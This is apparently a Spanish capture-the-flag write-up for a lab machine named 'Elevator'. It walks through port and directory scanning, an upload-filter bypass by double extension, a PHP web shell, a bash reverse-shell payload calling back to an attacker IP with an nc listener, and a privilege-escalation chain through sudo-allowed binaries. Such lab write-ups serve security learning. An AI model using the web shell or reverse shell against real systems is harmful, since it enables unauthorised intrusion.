# Máquina Elevator

## Verificación de Conectividad

Primero, verificamos la conectividad con la máquina utilizando **ping**:

![Ping a la máquina objetivo](https://github.com/user-attachments/assets/ccf1913f-1090-4440-b19c-99c02fa464ea)

## Reconocimiento de Puertos con NMAP

Iniciamos la fase de reconocimiento de los puertos de dicha máquina con **NMAP**:
```bash
nmap -p- -sT -sV -A $IP -oN elevator
```
![image](https://github.com/user-attachments/assets/71cb52df-a563-4f30-b629-338de6f946b0)

Al parecer, solamente tenemos el puerto 80 habilitado. Vamos a proceder a analizar dicha web.

Al parecer, es una simple web que, al presionar el botón **¡Abre el Ascensor!**, muestra una animación y un mensaje que aparece en la pantalla.

![image](https://github.com/user-attachments/assets/5a24029b-c718-4aef-bab5-07fef1ef97aa)
![image](https://github.com/user-attachments/assets/301493da-5523-4f1d-b624-edffdd161fc0)

Siguiendo con la etapa de reconocimiento, vamos a usar **Gobuster** para el reconocimiento de directorios de dicha web.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -b 403,404 -x php,txt,php.bak,bak,tar
```

![image](https://github.com/user-attachments/assets/848edb40-b853-488c-815a-723877351ebd)

También procedemos a realizar el reconocimiento de directorios con **Feroxbuster**.
```bash
feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -d 10 -t 200 -x php,txt,html,php.bak,bak,tar --status-codes 200
```

![image](https://github.com/user-attachments/assets/1009cbe7-526c-4e7c-a697-c7425620a0e8)

Con **Feroxbuster** encontramos 2 ficheros con extensión **PHP** y **HTML**, los cuales vamos a analizar para proceder a su explotación.

En la ruta `http://172.17.0.2/themes/upload.php` encontramos un fichero que la web está interpretando, pero no visualizamos nada.

![image](https://github.com/user-attachments/assets/3be38251-eb36-4699-893f-29828ac0bb3d)

En la siguiente ruta `http://172.17.0.2/themes/archivo.html` encontramos un apartado donde podemos subir imágenes con extensión JPG.

![image](https://github.com/user-attachments/assets/cf5347b1-1321-4ed2-9cb3-c3a0d15fe563)

Vamos a proceder primero a crear un fichero con la extensión `.php`, por si la web permite subir dicho fichero. Si es así, podemos aprovechar esta vulnerabilidad para ganar acceso a la máquina.
```php
<?php``
    system($_GET['cmd'])
?>
```

![image](https://github.com/user-attachments/assets/57d54f62-7969-4ec9-a289-9e174bace3c1)``

Procedemos a subir el fichero a la web.

![image](https://github.com/user-attachments/assets/07a53adf-c045-479f-b990-8d25c1feaf38)

Pero al subir nuestro fichero **PHP**, la web no lo permite; solo nos permite subir ficheros con extensión **JPG**.

![image](https://github.com/user-attachments/assets/efa7fbce-9d34-4d45-805c-bf736f166876)

Vamos a realizar el método de doble **"double extension attack"**. Este ataque aprovecha las configuraciones de seguridad de los servidores web que pueden estar configurados para permitir la carga de archivos con ciertas extensiones, como `.jpg`, pero no de otras, como `.php`. 

En este ataque, renombramos el archivo para que tenga una extensión doble, como `reverShell.php.jpg`, lo que engaña al servidor para que lo permita cargar, mientras que el archivo PHP podría ejecutarse al acceder a él.

![image](https://github.com/user-attachments/assets/f455ca75-1e51-4e66-84d9-d5fb934da5da)

Nuevamente probaremos subir el fichero con la extensión doble a la web y verificaremos si nos lo permite.

![image](https://github.com/user-attachments/assets/bbe9063c-8a45-4eea-9acf-80dc2e27bfe2)

**¡Bingo!** Logramos subir nuestro archivo y la web nos proporciona la ruta donde se encuentra ubicado. Procederemos a visualizarlo para comprobar si la web lo interpreta o no.

![image](https://github.com/user-attachments/assets/2221b44c-ae07-442d-a5af-62120f4f741d)

La web interpreta correctamente el archivo malicioso subido por nosotros.

![image](https://github.com/user-attachments/assets/46ae684c-4649-40b1-a442-b88936f312f6)


Al ejecutar el comando `id`, verificamos la respuesta del comando.

![image](https://github.com/user-attachments/assets/11ca7995-ad4f-42fc-89ce-146fdcb28464)

Ahora vamos a proceder a hacernos una revershell de la siguiente forma

[ * ] Web victima:
`172.17.0.2/themes/uploads/6764f820a0d32.jpg/?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.19/443 0>%261"`

![image](https://github.com/user-attachments/assets/5f53a80a-2959-4c82-85b3-b8968da9222d)

[ * ]  Shell Atacante
```bash
nc -nlvp 443
```
![image](https://github.com/user-attachments/assets/c7b2bfde-9d5f-438a-8a1b-ff17d1c0eda6)

¡Bummmmm! Estamos dentro de la máquina, pero como el usuario `www-data`. 

![image](https://github.com/user-attachments/assets/5649a008-e84e-479d-b29a-b1461df881b0)

Vamos a verificar los permisos SUID para determinar si es posible elevar privilegios a través de este método. Sin embargo, lamentablemente no podremos aprovechar esta vía.

![image](https://github.com/user-attachments/assets/af283685-a5ed-47ce-a493-be56dcc09527)

Procederemos a realizar el tratamiento de la TTY para establecer una sesión interactiva más estable.

![image](https://github.com/user-attachments/assets/67836fc2-27fc-41ce-b39a-91fd61e2365f)

![image](https://github.com/user-attachments/assets/bfe361cb-be55-47f8-a52a-32f94666d19a)


Vamos a listar los comandos que el usuario puede ejecutar con privilegios de `root` usando `sudo -l`.

![image](https://github.com/user-attachments/assets/867899f6-d535-4786-ab47-6233e3215063)

En este caso, no podemos migrar como root, pero sí podemos migrar como el usuario **daphne**, con el cual podemos usar el comando `env`.

Con **GTFOBins**, vamos a buscar el binario `env` y listar los comandos que el usuario puede ejecutar como **daphne**

![image](https://github.com/user-attachments/assets/eaa5afdc-5d69-43ec-a33d-1172ecb8360c)

![image](https://github.com/user-attachments/assets/3f7edfb7-9e27-45c5-9f83-775e4e412702)

Ya estando como el usuario **daphne**, procederemos a listar nuevamente los comandos disponibles para verificar si podemos migrar a otro usuario o escalar privilegios.

Al listar nuevamente, verificamos que podemos migrar al usuario **vilma** usando el comando `ash`.

![image](https://github.com/user-attachments/assets/e61ea684-7c5c-412c-b1b0-74527e308a31)

En **GTFOBins** nos indica cómo migrar, lo cual haremos con una pequeña modificación utilizando el parámetro `-u`, donde indicamos el nombre del usuario al cual vamos a migrar (en este caso, **vilma**).

![image](https://github.com/user-attachments/assets/97e3dc67-8d1e-4751-ac52-5fd09d0e5d6c)

![image](https://github.com/user-attachments/assets/86c4abcf-e0ef-498e-bb60-2caf8f917e79)

Al parecer, la temática es de esta forma. Vamos a listar nuevamente los comandos o posibles configuraciones disponibles para verificar si podemos continuar con la migración

En este caso, podemos migrar al usuario **shaggy** usando el binario de **ruby**. Nos ayudaremos de **GTFOBins**.

![image](https://github.com/user-attachments/assets/fed2f6dc-109c-4696-b67d-9c44c968db5a)

![image](https://github.com/user-attachments/assets/2338ad11-cabf-48d2-a940-cc59dc764925)

Ganamos acceso al usuario shaggy.

![image](https://github.com/user-attachments/assets/694c563b-20fa-402f-9e29-4f4102a2f32b)

Nuevamente, tenemos el binario **lua** para migrar como el usuario **fred**.

![image](https://github.com/user-attachments/assets/c6ba585c-5438-4139-8c4d-8c2fb04727e2)

![image](https://github.com/user-attachments/assets/775abda8-d31e-4632-97b4-4f0221524ce3)

Ahora logramos migrar al usuario **fred**.

![image](https://github.com/user-attachments/assets/b1ebe188-a860-4b66-a728-ceef6b5e84f4)

Para migrar al usuario **scooby**, tenemos que usar el binario **gcc**.

![image](https://github.com/user-attachments/assets/38523977-bfc3-4bf6-bdd8-fb7927a6e0db)

![image](https://github.com/user-attachments/assets/c45a7d93-1344-4aec-849a-7b5e395c48cc)

Logramos migrar al usuario **scooby**. Ahora, vamos a proceder nuevamente a listar.

![image](https://github.com/user-attachments/assets/47b5e7d3-9ef7-4906-95ed-2f59ec0a8a52)

Finalmente, podemos migrar al usuario **root** utilizando el binario **sudo**.

![image](https://github.com/user-attachments/assets/174b93d3-6efb-4009-b5d9-66c7e1dc1372)

![image](https://github.com/user-attachments/assets/1ed27c1e-8aa8-493d-98a3-14880958df35)

# $BLING $BLING SOMOS ~~ROOT~~

![image](https://github.com/user-attachments/assets/027d9ae5-281f-47f4-a943-110c6c318a79)
